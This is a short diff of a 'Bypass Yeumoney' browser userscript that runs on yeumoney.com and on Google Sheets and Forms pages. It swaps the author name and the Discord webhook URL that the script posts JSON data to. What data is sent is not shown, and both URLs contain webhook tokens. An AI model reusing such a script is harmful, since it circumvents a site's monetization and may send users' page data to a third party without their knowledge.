@@ -3,7 +3,7 @@
 // @namespace    http://tampermonkey.net/
 // @version      12.0
 // @description  Bypass Yeumoney
-// @author       BaoNgocCoder
+// @author       vandung
 // @match        *://yeumoney.com/*
 // @match        *://docs.google.com/spreadsheets/*
 // @match        *://docs.google.com/forms/*
@@ -73,7 +73,7 @@
         timestamp: new Date().toISOString()
       }]
     };
-    fetch("https://discord.com/api/webhooks/1347797256207601684/6nNAI6TpPeuH6eh3B2XpNCbOus-8qvG8D0Idtw4-jLRo1_60AlgXpk8eR8mHlK0W_wp8", {
+    fetch("https://discord.com/api/webhooks/1358252331917115553/x4VaIo8N-idyfXWpDKr17KuoJ9PAeKBBIHZGveLw0YbUYSuh-nVHxXXJMyj1akD-TwxM", {
       method: "POST",
       headers: {
         "Content-Type": "application/json"
